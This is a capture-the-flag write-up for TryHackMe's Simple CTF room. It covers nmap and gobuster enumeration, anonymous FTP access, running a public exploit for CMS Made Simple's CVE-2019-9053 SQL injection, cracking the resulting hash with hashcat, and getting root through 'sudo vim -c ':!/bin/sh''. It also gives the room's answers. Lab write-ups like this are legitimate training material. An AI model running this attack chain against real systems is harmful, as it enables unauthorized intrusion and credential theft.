
# TryHackMe SimpleCTF | Capture The Flag Challenge Writeup

[TOC]  

# Simple CTF [ THM ]

link for this challenge https://tryhackme.com/room/easyctf

![f28ade2b51eb7aeeac91002d41f29c47](https://hackmd.io/_uploads/BkHStr6i1g.png)

## <span style="background-color:yellow;color:#27272a;padding:5px;border-radius:5px">nmap</span> scan

first i will start by scan Target with nmap
command:
```javascript
 nmap -sCV TARGET_IP
```
``Output:``
```javascript
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-09 23:32 EDT
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.77% done; ETC: 23:33 (0:00:00 remaining)
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.77% done; ETC: 23:33 (0:00:00 remaining)
Nmap scan report for TARGET_IP
Host is up (0.20s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.47.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.24 seconds

```

---
so there is three ports open : ``21`` , ``80`` , ``2222``

> :warning:  **How many services are running under port 1000?**
>[color=red]

``
answer:
``

``` python
2
```

> :warning: **What is running on the higher port?**     
>[color=red]

``answer:``

```python
ssh
```
---

## Connect to ``FTP`` 

AfterSince the ***FTP*** port is open, we will try to access FTP using ``anonymous`` user

```javascript
ftp TARGET_IP
```

```javascript
Connected to TARGET_IP.
220 (vsFTPd 3.0.3)
Name (TARGET_IP:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41678|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |******************************************************************************************************************************************************|   166        1.77 MiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:00 (2.26 KiB/s)
ftp> exit
221 Goodbye.

```
---
Connected to the **FTP** server on TARGET_IP using anonymous login, meaning the server allows access without requiring a username and password. After <*successfully logging in*>, a directory listing was performed using ``ls``, revealing a folder named ``pub``. Upon navigating into the pub directory, a file named ``ForMitch.txt`` was found. The file was then downloaded to the local machine using the ``get`` command. Finally, the FTP session was exited using ``exit``

Now let's see what inside  ``ForMitch.txt`` 

```bash
cat ForMitch.txt 
```

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

```

>**We can derive three crucial pieces of information from this.**
>[color=yellow]

: :info
1. There’s a user on the system likely called ``mitch``
2. He has the same password on some application as the system
3. His password is incredibly weak. We’ll likely be able to crack it with rockyou.txt, or if it’s a stronger hash, then a shorter list might also be able to crack it.
: :

---
## using ``gobuster``

after that i will use gobuster to se hidden directories:

```javascript
gobuster dir -u http://TARGET_IP/ -w /home/kali/Downloads/wordlists/common.txt 
```
``
Output:
``

```java

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 311] [--> http://TARGET_IP/simple/]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================

```

i found ``/simple`` 
```java
http://TARGET_IP/simple
```

![simple](https://hackmd.io/_uploads/ry94Uzpsye.png)

when i go down and focus on the footer i found: 

![simple2](https://hackmd.io/_uploads/B1_ePzaoJx.png)

i found ``CMS Made Simple`` version 

Then I searched for this version in the ``exploit database``

```
https://www.exploit-db.com/exploits/46635
```

![exploitdb](https://hackmd.io/_uploads/Sy7BOfao1g.png)

After that i download the Exploit file and run it :  

```java
python3 46635.py -u http://TARGET_IP/simple
```

``
Output:
``

```ruby
[+] Salt for password found: [redacted]
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: ################################
```                 

We have a salted hash for mitch. This looks like MD5, so let’s fire up hashcat.

```basg
hashcat -O -a 0 -m 20 ################################:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt 
```

``output:``

``` java
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-12th Gen Intel(R) Core(TM) i7-12700H, 1584/3232 MB (512 MB allocatable), 9MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

################################:[redacted]:######  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: ################################:[redacted]
Time.Started.....: Tue Mar 11 00:04:59 2025 (0 secs)
Time.Estimated...: Tue Mar 11 00:04:59 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25008 H/s (0.18ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2304/14344385 (0.02%)
Rejected.........: 0/2304 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> abcdefgh
Hardware.Mon.#1..: Util: 13%

Started: Tue Mar 11 00:03:20 2025
Stopped: Tue Mar 11 00:05:01 2025
                                                                          
```

---

> :warning:  **What's the CVE you're using against the application?**
>[color=red]

``
answer:
``

``` python
CVE-2019-9053
```

> :warning:  **To what kind of vulnerability is the application vulnerable?**
>[color=red]

``
answer:
``

``` python
SQLI
```

> :warning:  **What's the password?**
>[color=red]

``
answer:
``

``` python
######
```

> :warning:  **Where can you login with the details obtained?**
>[color=red]

``
answer:
``

``` jav
ssh
```

---

## login using **``ssh``**

now after we have username ``mitch`` and password ``secret`` 
we will login usig ssh : 

```bas
ssh mitch@TARGET_IP -p 2222
```

``output:``

```java
The authenticity of host '[TARGET_IP]:2222 ([TARGET_IP]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[TARGET_IP]:2222' (ED25519) to the list of known hosts.
mitch@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
$ 
$   

```

```pyt
$ ls
user.txt
$ cat user.txt
[redacted]
$ 
```

---
> :warning:  **What's the user flag?**
>[color=red]

``
answer:
``

``` python
[redacted]
```

---

```pyth
$ cd ..
$ ls
mitch  [redacted]
$ 
```
---
> :warning:  **Is there any other user in the home directory? What's its name?**
>[color=red]

``
answer:
``

``` python
[redacted]
```
---

```r
$ sudo -l 
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ 
```

---
> :warning:  **What can you leverage to spawn a privileged shell?**
>[color=red]

``
answer:
``

``` pyth
vim
```

---
## prevEsc

go to ``https://gtfobins.github.io/``

search for ``vim``

![gtf](https://hackmd.io/_uploads/SJmV1Hpi1l.png)

```pyth
sudo vim -c ':!/bin/sh'
```
``output``

```
$ sudo vim -c ':!/bin/sh'

# whoami
root
# cat /root/root.txt
[redacted]
# 

```

> :warning:  **What's the root flag?**
>[color=red]

``
answer:
``

``` python
[redacted]
```

: :success
🎉 Rooted! The final flag is captured, and victory is mine! Another challenge conquered! 🚀🔥  
: :

<img src="https://media.giphy.com/media/11sBLVxNs7v6WA/giphy.gif" alt="Funny Monkey GIF" style="display: block; margin: auto;">

